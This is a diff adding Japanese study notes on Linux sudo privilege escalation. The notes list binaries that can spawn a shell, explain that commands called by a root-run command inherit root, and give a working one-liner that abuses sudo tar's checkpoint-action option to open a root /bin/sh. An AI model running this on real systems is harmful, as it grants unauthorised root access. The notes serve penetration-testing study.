@@ -21,3 +21,17 @@ User TCM may run the following commands on this host:
 
 目安として以下のものが出れば/bin/shを呼び出す
 「find」「awk」「vim」「man」「less」「more」「nmap」「ftp」
+
+※外部実行コマンドとは、プログラムの中からOSの別コマンドを呼び出せる機能
+
+sudo でrootをもったコマンドが、ほかのコマンドも呼んできて！というと、
+呼ばれたコマンドもrootとなる。
+
+
+Sudo -lを実行したときに帰ってきた答えが
+(root) /bin/tar
+だった場合。
+
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+Nopasswardがついていないため、sudoが必要
